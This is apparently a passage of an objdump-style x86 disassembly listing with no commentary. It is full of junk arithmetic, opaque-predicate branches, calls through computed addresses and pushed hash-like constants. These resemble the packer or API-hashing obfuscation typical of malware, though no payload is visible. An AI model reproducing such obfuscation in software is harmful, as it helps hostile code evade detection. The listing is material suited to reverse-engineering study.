  41960c:	mov    DWORD PTR [ebp-0x20],ecx
  41960f:	sub    edx,ebx
  419611:	sub    DWORD PTR [ebp-0x20],edi
  419614:	add    DWORD PTR [ebp-0x20],edx
  419617:	cmp    eax,0xffffffd2
  41961a:	je     0x419739
  419620:	mov    esi,0x804b5505
  419625:	mov    eax,DWORD PTR ds:0x459ef0
  41962b:	and    eax,ecx
  41962d:	sub    esi,edi
  41962f:	and    DWORD PTR [ebp-0x20],esi
  419632:	cmp    ebx,0x2044
  419638:	je     0x419659
  41963a:	mov    esi,0x7bc6
  41963f:	and    esi,ecx
  419641:	sub    DWORD PTR [ebp-0x20],esi
  419644:	sub    eax,esi
  419646:	cmp    ebx,0x5104
  41964c:	jne    0x419659
  41964e:	mov    ecx,0x94
  419653:	sub    DWORD PTR [ebp-0x20],eax
  419656:	add    DWORD PTR [ebp-0x20],ecx
  419659:	mov    esi,0xcba
  41965e:	sub    DWORD PTR [ebp-0x20],eax
  419661:	and    eax,ecx
  419663:	xor    DWORD PTR [ebp-0x20],ecx
  419666:	sub    DWORD PTR [ebp-0x20],eax
  419669:	mov    ebx,0xe8
  41966e:	mov    DWORD PTR [ebp-0x20],ebx
  419671:	mov    ecx,0x5d
  419676:	mov    eax,DWORD PTR [ebp-0x20]
  419679:	sub    DWORD PTR [ebp-0x20],esi
  41967c:	mov    DWORD PTR [ebp-0x20],ecx
  41967f:	or     DWORD PTR [ebp-0x20],eax
  419682:	mov    DWORD PTR [ebp-0x8],esi
  419685:	mov    eax,0xd4
  41968a:	mov    edx,0xe356
  41968f:	sub    eax,edx
  419691:	add    DWORD PTR [ebp-0x20],ecx
  419694:	sub    DWORD PTR [ebp-0x20],esi
  419697:	and    eax,esi
  419699:	sub    ecx,edi
  41969b:	and    DWORD PTR [ebp-0x20],edx
  41969e:	add    eax,ebx
  4196a0:	add    ecx,edx
  4196a2:	sub    eax,ebx
  4196a4:	sub    eax,esi
  4196a6:	or     DWORD PTR [ebp-0x20],eax
  4196a9:	add    DWORD PTR [ebp-0x20],ecx
  4196ac:	and    edx,eax
  4196ae:	or     edx,edi
  4196b0:	add    DWORD PTR [ebp-0x20],edx
  4196b3:	and    ebx,esi
  4196b5:	mov    eax,DWORD PTR [ebp-0x20]
  4196b8:	mov    edi,0x3e
  4196bd:	cmp    eax,edi
  4196bf:	jne    0x4196d9
  4196c1:	mov    edi,0xd4
  4196c6:	mov    edx,DWORD PTR [ebp-0x20]
  4196c9:	add    edi,eax
  4196cb:	sub    DWORD PTR [ebp-0x20],edx
  4196ce:	cmp    edi,DWORD PTR ds:0x459ef0
  4196d4:	je     0x4196d9
  4196d6:	add    DWORD PTR [ebp-0x20],edi
  4196d9:	sub    DWORD PTR [ebp-0x20],eax
  4196dc:	sub    ebx,esi
  4196de:	sub    edi,ebx
  4196e0:	sub    DWORD PTR [ebp-0x20],edi
  4196e3:	or     DWORD PTR [ebp-0x20],edi
  4196e6:	add    ebx,esi
  4196e8:	mov    edx,DWORD PTR [ebp-0x20]
  4196eb:	cmp    edx,0xbb51
  4196f1:	jne    0x41971c
  4196f3:	cmp    edx,0x9ec6
  4196f9:	jne    0x41971c
  4196fb:	mov    edi,DWORD PTR [ebp-0x20]
  4196fe:	sub    edx,ecx
  419700:	mov    esi,DWORD PTR [ebp-0x20]
  419703:	sub    esi,eax
  419705:	add    DWORD PTR [ebp-0x20],edx
  419708:	sub    edi,edx
  41970a:	add    DWORD PTR [ebp-0x20],ebx
  41970d:	cmp    esi,DWORD PTR [ebp-0xc]
  419710:	je     0x41971c
  419712:	sub    DWORD PTR [ebp-0x20],edi
  419715:	cmp    esi,edx
  419717:	jne    0x41971c
  419719:	or     DWORD PTR [ebp-0x20],esi
  41971c:	mov    eax,DWORD PTR [ebp-0x20]
  41971f:	sub    DWORD PTR [ebp-0x20],eax
  419722:	add    DWORD PTR [ebp-0x8],ebx
  419725:	mov    ecx,0x2e
  41972a:	add    ecx,eax
  41972c:	mov    edi,0x41
  419731:	add    edi,ebx
  419733:	or     DWORD PTR [ebp-0x20],edi
  419736:	or     DWORD PTR [ebp-0x20],ecx
  419739:	mov    edx,DWORD PTR [ebp-0x20]
  41973c:	mov    esi,DWORD PTR [ebp-0x20]
  41973f:	sub    DWORD PTR [ebp-0x20],esi
  419742:	xor    DWORD PTR [ebp-0x20],edx
  419745:	mov    ebx,0x50000a04
  41974a:	mov    ecx,DWORD PTR ds:0x459ef0
  419750:	sub    ebx,esi
  419752:	add    DWORD PTR [ebp-0x20],eax
  419755:	cmp    eax,0x5b
  419758:	je     0x4197aa
  41975a:	mov    edx,DWORD PTR [ebp-0x20]
  41975d:	mov    DWORD PTR [ebp-0x20],ecx
  419760:	add    DWORD PTR [ebp-0x20],ebx
  419763:	mov    edi,0xa
  419768:	sub    edx,eax
  41976a:	cmp    ebx,0x24
  41976d:	jne    0x4197aa
  41976f:	sub    DWORD PTR [ebp-0x20],ebx
  419772:	cmp    edx,DWORD PTR ds:0x459ef0
  419778:	je     0x4197aa
  41977a:	add    edx,ebx
  41977c:	sub    DWORD PTR [ebp-0x20],ebx
  41977f:	cmp    edx,edi
  419781:	jne    0x4197aa
  419783:	add    edx,ecx
  419785:	mov    eax,DWORD PTR [ebp-0x20]
  419788:	mov    ecx,0xd
  41978d:	sub    edx,ecx
  41978f:	and    DWORD PTR [ebp-0x20],eax
  419792:	test   edx,0x2599
  419798:	jne    0x4197aa
  41979a:	mov    eax,DWORD PTR [ebp-0x20]
  41979d:	sub    DWORD PTR [ebp-0x20],eax
  4197a0:	sub    edi,eax
  4197a2:	or     edx,ebx
  4197a4:	mov    DWORD PTR [ebp-0x20],edx
  4197a7:	add    DWORD PTR [ebp-0x20],edi
  4197aa:	lea    eax,[ebp-0xcc]
  4197b0:	push   eax
  4197b1:	call   DWORD PTR ds:0x45a508
  4197b7:	mov    edx,DWORD PTR [ebp-0x20]
  4197ba:	cmp    edx,0x8
  4197bd:	je     0x4197c2
  4197bf:	or     DWORD PTR [ebp-0x20],edx
  4197c2:	lea    eax,[ebp-0xe8]
  4197c8:	push   eax
  4197c9:	call   DWORD PTR ds:0x45a58c
  4197cf:	mov    ebx,DWORD PTR [ebp-0x20]
  4197d2:	add    ebx,esi
  4197d4:	cmp    ebx,edi
  4197d6:	je     0x4197db
  4197d8:	add    DWORD PTR [ebp-0x20],ebx
  4197db:	sub    eax,ebx
  4197dd:	mov    DWORD PTR [ebp-0x20],edi
  4197e0:	cmp    ebx,0xffffffde
  4197e3:	je     0x419818
  4197e5:	mov    ecx,DWORD PTR [ebp-0x20]
  4197e8:	mov    edx,0x38
  4197ed:	cmp    ecx,0x3a
  4197f0:	je     0x419818
  4197f2:	sub    DWORD PTR [ebp-0x20],eax
  4197f5:	mov    esi,DWORD PTR [ebp-0x20]
  4197f8:	mov    ebx,DWORD PTR [ebp-0x20]
  4197fb:	mov    DWORD PTR [ebp-0x20],ecx
  4197fe:	cmp    ecx,DWORD PTR ds:0x459ef0
  419804:	jne    0x419818
  419806:	add    DWORD PTR [ebp-0x20],ecx
  419809:	mov    ecx,DWORD PTR [ebp-0x20]
  41980c:	sub    DWORD PTR [ebp-0x20],ebx
  41980f:	and    DWORD PTR [ebp-0x20],ecx
  419812:	and    DWORD PTR [ebp-0x20],esi
  419815:	sub    DWORD PTR [ebp-0x20],edx
  419818:	cmp    esi,0x201f2c40
  41981e:	je     0x419909
  419824:	or     esi,edx
  419826:	mov    ecx,DWORD PTR [ebp-0x20]
  419829:	cmp    ecx,0xffffffa7
  41982c:	jne    0x419909
  419832:	cmp    ecx,0x11
  419835:	jne    0x419909
  41983b:	sub    ecx,edi
  41983d:	mov    eax,DWORD PTR ds:0x459ef0
  419843:	sub    ecx,ebx
  419845:	sub    DWORD PTR [ebp-0x20],esi
  419848:	mov    edx,0xa5
  41984d:	cmp    ecx,DWORD PTR ds:0x459ef0
  419853:	jne    0x419909
  419859:	sub    edx,ecx
  41985b:	add    DWORD PTR [ebp-0x20],edx
  41985e:	add    eax,ebx
  419860:	mov    edx,esi
  419862:	mov    edi,DWORD PTR [ebp-0x20]
  419865:	mov    DWORD PTR [ebp-0x20],edi
  419868:	cmp    eax,edx
  41986a:	je     0x419909
  419870:	add    eax,eax
  419872:	mov    ecx,DWORD PTR [ebp-0x20]
  419875:	mov    ebx,DWORD PTR [ebp-0x20]
  419878:	add    DWORD PTR [ebp-0x20],eax
  41987b:	test   esi,0x4d
  419881:	je     0x419909
  419887:	add    DWORD PTR [ebp-0x20],ecx
  41988a:	cmp    ebx,DWORD PTR ds:0x459ef0
  419890:	jne    0x419909
  419892:	mov    esi,DWORD PTR [ebp-0x20]
  419895:	sub    DWORD PTR [ebp-0x20],edx
  419898:	and    esi,edx
  41989a:	and    DWORD PTR [ebp-0x20],esi
  41989d:	mov    eax,0x52d0
  4198a2:	test   edi,0xd763
  4198a8:	je     0x419909
  4198aa:	mov    esi,DWORD PTR [ebp-0x20]
  4198ad:	mov    edi,0x96
  4198b2:	xor    DWORD PTR [ebp-0x20],eax
  4198b5:	cmp    ebx,edi
  4198b7:	jne    0x419909
  4198b9:	sub    DWORD PTR [ebp-0x20],eax
  4198bc:	cmp    esi,DWORD PTR [ebp-0x20]
  4198bf:	jne    0x419909
  4198c1:	sub    esi,ecx
  4198c3:	mov    ecx,0xed
  4198c8:	mov    eax,ebx
  4198ca:	sub    eax,edx
  4198cc:	add    eax,edx
  4198ce:	cmp    eax,DWORD PTR ds:0x459ef0
  4198d4:	jne    0x419909
  4198d6:	mov    ebx,0x1d41
  4198db:	mov    edx,DWORD PTR [ebp-0x20]
  4198de:	add    DWORD PTR [ebp-0x20],ecx
  4198e1:	sub    DWORD PTR [ebp-0x20],edx
  4198e4:	test   esi,0x68
  4198ea:	je     0x419909
  4198ec:	and    DWORD PTR [ebp-0x20],esi
  4198ef:	sub    ebx,eax
  4198f1:	add    DWORD PTR [ebp-0x20],edx
  4198f4:	and    edi,ebx
  4198f6:	mov    edx,0xf6
  4198fb:	add    edx,ebx
  4198fd:	sub    DWORD PTR [ebp-0x20],edi
  419900:	sub    edx,esi
  419902:	cmp    edx,edi
  419904:	je     0x419909
  419906:	sub    DWORD PTR [ebp-0x20],edx
  419909:	mov    edi,DWORD PTR [ebp-0x20]
  41990c:	and    edi,edx
  41990e:	mov    ebx,DWORD PTR [ebp-0x20]
  419911:	cmp    ebx,0xffffffff
  419914:	je     0x419943
  419916:	add    edi,edi
  419918:	cmp    ebx,DWORD PTR ds:0x459ef0
  41991e:	je     0x419943
  419920:	mov    esi,0x65
  419925:	or     edi,esi
  419927:	add    DWORD PTR [ebp-0x20],ecx
  41992a:	add    DWORD PTR [ebp-0x20],ebx
  41992d:	mov    edx,DWORD PTR [ebp-0x20]
  419930:	cmp    edi,DWORD PTR [ebp-0xe0]
  419936:	jne    0x419943
  419938:	cmp    edi,DWORD PTR [ebp-0x14]
  41993b:	jne    0x419943
  41993d:	mov    DWORD PTR [ebp-0x20],edi
  419940:	add    DWORD PTR [ebp-0x20],edx
  419943:	mov    ecx,DWORD PTR ds:0x459ef0
  419949:	and    ecx,ebx
  41994b:	and    ecx,edx
  41994d:	cmp    ecx,DWORD PTR ds:0x459ef0
  419953:	jne    0x41995d
  419955:	cmp    ecx,0xe
  419958:	jne    0x41995d
  41995a:	or     DWORD PTR [ebp-0x20],ecx
  41995d:	sub    esi,ebx
  41995f:	sub    esi,edi
  419961:	sub    esi,eax
  419963:	mov    ecx,DWORD PTR [ebp-0x20]
  419966:	cmp    ecx,edi
  419968:	je     0x4199b2
  41996a:	cmp    esi,DWORD PTR [ebp-0x10]
  41996d:	jne    0x4199b2
  41996f:	sub    DWORD PTR [ebp-0x20],ecx
  419972:	add    esi,eax
  419974:	mov    ecx,DWORD PTR ds:0x459ef0
  41997a:	sub    DWORD PTR [ebp-0x20],esi
  41997d:	mov    edx,DWORD PTR [ebp-0x20]
  419980:	and    ecx,edx
  419982:	test   ecx,0xd9
  419988:	je     0x4199b2
  41998a:	mov    eax,0x73
  41998f:	sub    ecx,esi
  419991:	add    ecx,edi
  419993:	sub    DWORD PTR [ebp-0x20],esi
  419996:	mov    edx,DWORD PTR [ebp-0x20]
  419999:	add    edx,edx
  41999b:	add    ecx,edi
  41999d:	sub    DWORD PTR [ebp-0x20],edx
  4199a0:	and    ecx,esi
  4199a2:	and    DWORD PTR [ebp-0x20],ebx
  4199a5:	cmp    ecx,0xfffffffd
  4199a8:	je     0x4199ad
  4199aa:	sub    DWORD PTR [ebp-0x20],ecx
  4199ad:	add    eax,ecx
  4199af:	sub    DWORD PTR [ebp-0x20],eax
  4199b2:	test   ebx,0x72
  4199b8:	jne    0x4199d4
  4199ba:	mov    ecx,DWORD PTR [ebp-0x20]
  4199bd:	mov    edi,DWORD PTR [ebp-0x20]
  4199c0:	sub    ecx,edi
  4199c2:	cmp    ecx,DWORD PTR [ebp-0xc]
  4199c5:	je     0x4199d4
  4199c7:	sub    ecx,edi
  4199c9:	mov    eax,0x1bf5
  4199ce:	add    DWORD PTR [ebp-0x20],ecx
  4199d1:	add    DWORD PTR [ebp-0x20],eax
  4199d4:	sub    eax,esi
  4199d6:	mov    ebx,0x35
  4199db:	and    ebx,eax
  4199dd:	mov    edx,DWORD PTR [ebp-0x20]
  4199e0:	mov    DWORD PTR [ebp-0x20],edx
  4199e3:	sub    DWORD PTR [ebp-0x20],ebx
  4199e6:	mov    ecx,DWORD PTR ds:0x459ee4
  4199ec:	mov    esi,DWORD PTR ds:0x459ee4
  4199f2:	sub    DWORD PTR [ebp-0x20],ecx
  4199f5:	or     esi,edx
  4199f7:	add    esi,esi
  4199f9:	add    esi,eax
  4199fb:	add    esi,ecx
  4199fd:	sub    DWORD PTR [ebp-0x20],esi
  419a00:	cmp    esi,DWORD PTR ds:0x459ee4
  419a06:	je     0x419a48
  419a08:	mov    edi,DWORD PTR [ebp-0x20]
  419a0b:	add    edi,esi
  419a0d:	cmp    edi,0x71
  419a10:	je     0x419a48
  419a12:	or     edi,ecx
  419a14:	mov    esi,0x77
  419a19:	add    edi,eax
  419a1b:	mov    edx,0xad
  419a20:	add    edx,ebx
  419a22:	add    DWORD PTR [ebp-0x20],edx
  419a25:	test   edi,0xb0
  419a2b:	je     0x419a48
  419a2d:	mov    edx,0x80284002
  419a32:	add    edx,ecx
  419a34:	and    edi,eax
  419a36:	add    edi,esi
  419a38:	mov    eax,DWORD PTR [ebp-0x20]
  419a3b:	xor    DWORD PTR [ebp-0x20],edi
  419a3e:	sub    DWORD PTR [ebp-0x20],eax
  419a41:	sub    ecx,ebx
  419a43:	and    ecx,edx
  419a45:	mov    DWORD PTR [ebp-0x20],ecx
  419a48:	mov    eax,DWORD PTR [ebp-0x20]
  419a4b:	cmp    eax,ecx
  419a4d:	jne    0x419a52
  419a4f:	add    DWORD PTR [ebp-0x20],eax
  419a52:	sub    ecx,esi
  419a54:	mov    ebx,DWORD PTR [ebp-0x20]
  419a57:	cmp    ebx,ecx
  419a59:	jne    0x419a9d
  419a5b:	cmp    ebx,DWORD PTR [ebp-0x20]
  419a5e:	je     0x419a9d
  419a60:	add    ecx,ebx
  419a62:	or     ecx,edx
  419a64:	mov    esi,DWORD PTR ds:0x459ee4
  419a6a:	cmp    ecx,0x92af
  419a70:	jne    0x419a9d
  419a72:	mov    edx,DWORD PTR [ebp-0x20]
  419a75:	cmp    edx,DWORD PTR ds:0x459ee4
  419a7b:	je     0x419a9d
  419a7d:	mov    ebx,DWORD PTR [ebp-0x20]
  419a80:	mov    edi,0x3c
  419a85:	sub    edi,edx
  419a87:	xor    DWORD PTR [ebp-0x20],ebx
  419a8a:	add    ecx,esi
  419a8c:	sub    edi,edx
  419a8e:	cmp    ebx,eax
  419a90:	jne    0x419a9d
  419a92:	sub    DWORD PTR [ebp-0x20],edx
  419a95:	sub    DWORD PTR [ebp-0x20],edi
  419a98:	sub    ecx,ebx
  419a9a:	sub    DWORD PTR [ebp-0x20],ecx
  419a9d:	sub    DWORD PTR [ebp-0x20],esi
  419aa0:	sub    DWORD PTR [ebp-0x20],edx
  419aa3:	mov    edx,0xb2
  419aa8:	cmp    ebx,DWORD PTR [ebp-0xd8]
  419aae:	je     0x419aba
  419ab0:	sub    edx,ebx
  419ab2:	or     edx,esi
  419ab4:	mov    DWORD PTR [ebp-0xf0],edx
  419aba:	mov    edx,0xcb
  419abf:	mov    esi,DWORD PTR [ebp-0x20]
  419ac2:	add    DWORD PTR [ebp-0x20],esi
  419ac5:	cmp    esi,DWORD PTR [ebp-0xe0]
  419acb:	jne    0x419aee
  419acd:	mov    edi,DWORD PTR ds:0x459e98
  419ad3:	sub    edi,edx
  419ad5:	mov    ecx,0x90
  419ada:	sub    DWORD PTR [ebp-0x20],edi
  419add:	add    ecx,ebx
  419adf:	cmp    ecx,0x44ff
  419ae5:	je     0x419aee
  419ae7:	cmp    ecx,ebx
  419ae9:	je     0x419aee
  419aeb:	sub    DWORD PTR [ebp-0x20],ecx
  419aee:	cmp    ecx,DWORD PTR ds:0x459e98
  419af4:	jne    0x419afc
  419af6:	mov    edx,DWORD PTR [ebp-0x20]
  419af9:	add    DWORD PTR [ebp-0x20],edx
  419afc:	mov    eax,DWORD PTR [ebp-0x20]
  419aff:	mov    ecx,DWORD PTR [ebp-0x20]
  419b02:	sub    eax,esi
  419b04:	sub    ecx,edx
  419b06:	sub    ecx,edx
  419b08:	cmp    eax,0x76
  419b0b:	je     0x419b2c
  419b0d:	add    DWORD PTR [ebp-0x20],ecx
  419b10:	mov    esi,DWORD PTR [ebp-0x20]
  419b13:	mov    edi,0x69
  419b18:	or     esi,edx
  419b1a:	sub    eax,ebx
  419b1c:	add    edi,edi
  419b1e:	sub    DWORD PTR [ebp-0x20],eax
  419b21:	or     DWORD PTR [ebp-0x20],eax
  419b24:	add    DWORD PTR [ebp-0x20],esi
  419b27:	add    edi,edi
  419b29:	mov    DWORD PTR [ebp-0x4],edi
  419b2c:	mov    edx,DWORD PTR [ebp-0x20]
  419b2f:	mov    ecx,DWORD PTR [ebp-0x20]
  419b32:	cmp    ecx,0x44
  419b35:	je     0x419b55
  419b37:	sub    edx,ebx
  419b39:	sub    edx,eax
  419b3b:	or     edx,eax
  419b3d:	mov    esi,edi
  419b3f:	sub    DWORD PTR [ebp-0x20],edx
  419b42:	sub    DWORD PTR [ebp-0x20],ecx
  419b45:	and    ecx,eax
  419b47:	mov    ebx,0xbd
  419b4c:	sub    DWORD PTR [ebp-0x20],ebx
  419b4f:	sub    DWORD PTR [ebp-0x20],ecx
  419b52:	or     DWORD PTR [ebp-0x20],esi
  419b55:	or     eax,esi
  419b57:	add    DWORD PTR [ebp-0x20],eax
  419b5a:	sub    DWORD PTR [ebp-0x20],esi
  419b5d:	lea    ebx,[ebp-0xe4]
  419b63:	add    edx,edx
  419b65:	cmp    ebx,esi
  419b67:	jne    0x419b82
  419b69:	mov    edi,ecx
  419b6b:	add    DWORD PTR [ebp-0x20],ecx
  419b6e:	add    DWORD PTR [ebp-0x20],ebx
  419b71:	mov    eax,DWORD PTR ds:0x459ef0
  419b77:	mov    DWORD PTR [ebp-0x20],edx
  419b7a:	sub    DWORD PTR [ebp-0x20],edi
  419b7d:	add    eax,edi
  419b7f:	sub    DWORD PTR [ebp-0x20],eax
  419b82:	and    edi,eax
  419b84:	or     DWORD PTR [ebp-0x20],edi
  419b87:	push   ebx
  419b88:	mov    ebx,DWORD PTR [ebp-0x20]
  419b8b:	sub    DWORD PTR [ebp-0x20],ecx
  419b8e:	and    ebx,esi
  419b90:	test   ebx,0xfc
  419b96:	jne    0x419bc9
  419b98:	mov    edi,DWORD PTR [ebp-0x20]
  419b9b:	mov    ecx,DWORD PTR [ebp-0x20]
  419b9e:	cmp    edi,eax
  419ba0:	jne    0x419bc9
  419ba2:	add    ecx,ecx
  419ba4:	mov    DWORD PTR [ebp-0xdc],ebx
  419baa:	mov    esi,DWORD PTR [ebp-0xdc]
  419bb0:	mov    ebx,DWORD PTR [ebp-0xdc]
  419bb6:	add    DWORD PTR [ebp-0x20],edi
  419bb9:	sub    ecx,esi
  419bbb:	mov    DWORD PTR [ebp-0xd4],ecx
  419bc1:	sub    ebx,ecx
  419bc3:	add    DWORD PTR [ebp-0xdc],ebx
  419bc9:	push   0x4aea469
  419bce:	add    DWORD PTR [ebp-0x20],edx
  419bd1:	mov    esi,0xb0
  419bd6:	and    esi,edx
  419bd8:	mov    eax,DWORD PTR [ebp-0x20]
  419bdb:	sub    DWORD PTR [ebp-0x20],ebx
  419bde:	sub    DWORD PTR [ebp-0x20],eax
  419be1:	cmp    esi,DWORD PTR ds:0x459ef0
  419be7:	je     0x419bec
  419be9:	add    DWORD PTR [ebp-0x20],esi
  419bec:	call   0x41a0bc
  419bf1:	mov    edx,DWORD PTR ds:0x459ee4
  419bf7:	mov    esi,0xdc18
  419bfc:	test   edi,0xc04645f0
  419c02:	je     0x419c30
  419c04:	and    esi,edx
  419c06:	mov    ebx,DWORD PTR ds:0x459ec4
  419c0c:	add    ebx,esi
  419c0e:	mov    edx,esi
  419c10:	add    DWORD PTR [ebp-0x20],ebx
  419c13:	sub    DWORD PTR [ebp-0x20],ebx
  419c16:	sub    edx,esi
  419c18:	and    edx,esi
  419c1a:	add    DWORD PTR [ebp-0x20],eax
  419c1d:	cmp    eax,0x59
  419c20:	jne    0x419c30
  419c22:	mov    ebx,DWORD PTR [ebp-0x20]
  419c25:	mov    edx,0x54
  419c2a:	sub    DWORD PTR [ebp-0x20],edx
  419c2d:	add    DWORD PTR [ebp-0x20],ebx
  419c30:	mov    ebx,DWORD PTR [ebp-0xe4]
  419c36:	cmp    ebx,DWORD PTR ds:0x459ee4
  419c3c:	je     0x419c51
  419c3e:	mov    edx,esi
  419c40:	and    edx,ebx
  419c42:	mov    esi,DWORD PTR [ebp-0x20]
  419c45:	add    edx,edi
  419c47:	sub    DWORD PTR [ebp-0x20],esi
  419c4a:	and    edx,esi
  419c4c:	add    edx,eax
  419c4e:	add    DWORD PTR [ebp-0x20],edx
  419c51:	shr    ebx,0x10
  419c54:	add    eax,esi
  419c56:	test   edx,0xe5
  419c5c:	je     0x419c80
  419c5e:	add    DWORD PTR [ebp-0x20],ebx
  419c61:	cmp    eax,DWORD PTR ds:0x459ef0
  419c67:	jne    0x419c80
  419c69:	cmp    eax,0x5a
  419c6c:	je     0x419c80
  419c6e:	cmp    esi,0xde3a
  419c74:	jne    0x419c80
  419c76:	cmp    eax,0x1e
  419c79:	jne    0x419c80
  419c7b:	sub    eax,esi
  419c7d:	add    DWORD PTR [ebp-0x20],eax
  419c80:	cmp    ebx,0xf758
  419c86:	jne    0x419f5b
  419c8c:	mov    edx,DWORD PTR [ebp-0x20]
  419c8f:	mov    esi,ebx
  419c91:	or     DWORD PTR [ebp-0x20],edx
  419c94:	add    DWORD PTR [ebp-0x20],esi
  419c97:	mov    ecx,0xf79ab0cf
  419c9c:	add    DWORD PTR [ebp-0x20],ecx
  419c9f:	sub    ecx,DWORD PTR [ebp-0xe4]
  419ca5:	mov    esi,0x7c
  419caa:	or     DWORD PTR [ebp-0x20],ecx
  419cad:	mov    edx,DWORD PTR ds:0x459ea8
  419cb3:	sub    edx,esi
  419cb5:	mov    DWORD PTR [ebp-0x20],edx
  419cb8:	call   ecx
  419cba:	cmp    eax,0xe7f4
  419cbf:	je     0x419d48
  419cc5:	mov    edx,DWORD PTR ds:0x459ea8
  419ccb:	mov    ebx,0x56
  419cd0:	add    DWORD PTR [ebp-0x20],ebx
  419cd3:	add    DWORD PTR [ebp-0x20],edi
  419cd6:	and    edx,esi
  419cd8:	sub    esi,edi
  419cda:	test   esi,0x29
  419ce0:	jne    0x419d48
  419ce2:	add    edx,ebx
  419ce4:	sub    DWORD PTR [ebp-0x20],esi
  419ce7:	add    edx,edx
  419ce9:	mov    edi,DWORD PTR [ebp-0x20]
  419cec:	mov    esi,DWORD PTR [ebp-0x20]
  419cef:	add    esi,eax
  419cf1:	add    DWORD PTR [ebp-0x20],edx
  419cf4:	sub    esi,eax
  419cf6:	test   edi,0x2689
  419cfc:	je     0x419d48
  419cfe:	mov    edx,esi
  419d00:	mov    ebx,DWORD PTR [ebp-0x20]
  419d03:	sub    edx,eax
  419d05:	sub    edi,eax
  419d07:	cmp    edx,DWORD PTR ds:0x459ea8
  419d0d:	jne    0x419d48
  419d0f:	sub    edi,eax
  419d11:	or     ebx,eax
  419d13:	cmp    edx,esi
  419d15:	je     0x419d48
  419d17:	add    edx,edi
  419d19:	sub    ebx,eax
  419d1b:	mov    edi,0x5e
  419d20:	mov    esi,DWORD PTR [ebp-0x20]
  419d23:	and    DWORD PTR [ebp-0x20],ebx
  419d26:	add    esi,esi
  419d28:	cmp    esi,0xffffffbf
  419d2b:	je     0x419d48
  419d2d:	mov    ecx,0x3846
  419d32:	sub    DWORD PTR [ebp-0x20],esi
  419d35:	mov    esi,DWORD PTR ds:0x459ec4
  419d3b:	and    DWORD PTR [ebp-0x20],ecx
  419d3e:	sub    DWORD PTR [ebp-0x20],edi
  419d41:	add    esi,edx
  419d43:	sub    esi,edi
  419d45:	add    DWORD PTR [ebp-0x20],esi
  419d48:	mov    DWORD PTR [ebp-0x18],eax
  419d4b:	mov    ecx,DWORD PTR [ebp-0x20]
  419d4e:	mov    esi,0xdb
  419d53:	sub    ecx,ebx
  419d55:	and    DWORD PTR [ebp-0x20],esi
  419d58:	sub    DWORD PTR [ebp-0x20],ecx
  419d5b:	mov    ecx,0x41aedf
  419d60:	sub    DWORD PTR [ebp-0x20],ebx
  419d63:	push   DWORD PTR [ebp-0xe4]
  419d69:	push   0xf75a4ddf
  419d6e:	push   DWORD PTR [ebp-0x18]
  419d71:	call   ecx
  419d73:	mov    ecx,edi
  419d75:	mov    ecx,DWORD PTR ds:0x459ee4
  419d7b:	cmp    eax,0xb716
  419d80:	jne    0x419edb
  419d86:	mov    edx,DWORD PTR [ebp-0x20]
  419d89:	mov    eax,DWORD PTR [ebp-0x20]
  419d8c:	cmp    ebx,0xffffffad
  419d8f:	jne    0x419edb
  419d95:	cmp    edx,DWORD PTR ds:0x459ec4
  419d9b:	je     0x419edb
  419da1:	mov    ebx,0x74
  419da6:	sub    DWORD PTR [ebp-0x20],esi
  419da9:	mov    esi,0x1e
  419dae:	cmp    edx,DWORD PTR [ebp-0xd4]
  419db4:	je     0x419edb
  419dba:	add    ebx,edx
  419dbc:	mov    ecx,DWORD PTR ds:0x459e78
  419dc2:	mov    edx,DWORD PTR [ebp-0x20]
  419dc5:	or     DWORD PTR [ebp-0x20],eax
  419dc8:	cmp    edx,0xfffffffe
  419dcb:	jne    0x419edb
  419dd1:	sub    edx,edi
  419dd3:	add    esi,esi
  419dd5:	cmp    edx,DWORD PTR ds:0x459ea8
  419ddb:	je     0x419edb
  419de1:	test   edx,0xad11
  419de7:	jne    0x419edb
  419ded:	add    edx,ecx
  419def:	mov    ecx,0x5
  419df4:	mov    DWORD PTR [ebp-0xec],ecx
  419dfa:	add    esi,esi
  419dfc:	mov    edi,DWORD PTR ds:0x459f04
  419e02:	test   ebx,0x42
  419e08:	je     0x419edb
  419e0e:	mov    eax,edi
  419e10:	add    DWORD PTR [ebp-0xec],eax
  419e16:	mov    edi,DWORD PTR [ebp-0x20]
  419e19:	add    ebx,edx
  419e1b:	cmp    edx,DWORD PTR ds:0x459ec4
  419e21:	jne    0x419edb
  419e27:	add    DWORD PTR [ebp-0x20],edi
  419e2a:	mov    esi,0x84
  419e2f:	add    esi,ebx
  419e31:	cmp    esi,0xb26e
  419e37:	je     0x419edb
  419e3d:	cmp    esi,DWORD PTR [ebp-0xe0]
  419e43:	jne    0x419edb
  419e49:	add    esi,esi
  419e4b:	mov    ebx,0xd0
  419e50:	mov    ecx,DWORD PTR [ebp-0xec]
  419e56:	sub    DWORD PTR [ebp-0xec],ecx
  419e5c:	and    ebx,ecx
  419e5e:	cmp    edx,0x31
  419e61:	je     0x419edb
  419e63:	mov    edi,0x6d
  419e68:	mov    ecx,esi
  419e6a:	cmp    ebx,DWORD PTR ds:0x459ef0
  419e70:	je     0x419edb
  419e72:	add    DWORD PTR [ebp-0x20],edi
  419e75:	add    ecx,edi
  419e77:	sub    DWORD PTR [ebp-0x20],ebx
  419e7a:	cmp    ecx,0xffffffd5
  419e7d:	jne    0x419edb
  419e7f:	mov    edx,DWORD PTR ds:0x459ea8
  419e85:	mov    edi,DWORD PTR [ebp-0xec]
  419e8b:	sub    ecx,eax
  419e8d:	add    DWORD PTR [ebp-0xec],ecx
  419e93:	test   edi,0x42
  419e99:	je     0x419edb
  419e9b:	mov    ebx,DWORD PTR [ebp-0x20]
  419e9e:	mov    ecx,ebx
  419ea0:	cmp    ecx,DWORD PTR ds:0x459e98
  419ea6:	jne    0x419edb
  419ea8:	mov    edx,DWORD PTR ds:0x459f04
  419eae:	cmp    ecx,DWORD PTR [ebp-0x4]
  419eb1:	jne    0x419edb
  419eb3:	cmp    edi,DWORD PTR ds:0x459ea8
  419eb9:	je     0x419edb
  419ebb:	and    DWORD PTR [ebp-0x20],ecx
  419ebe:	sub    DWORD PTR [ebp-0xec],eax
  419ec4:	mov    esi,0x536c
  419ec9:	mov    edx,esi
  419ecb:	sub    edi,eax
  419ecd:	add    DWORD PTR [ebp-0x20],edx
  419ed0:	cmp    edi,0x33b7
  419ed6:	je     0x419edb
  419ed8:	and    DWORD PTR [ebp-0x20],edi
  419edb:	add    DWORD PTR [ebp-0x18],0x14
  419ee2:	sub    esi,edi
  419ee4:	and    DWORD PTR [ebp-0x20],eax
  419ee7:	cmp    esi,DWORD PTR ds:0x459f04
  419eed:	je     0x419f23
  419eef:	sub    esi,edx
  419ef1:	cmp    esi,DWORD PTR [ebp-0xf0]
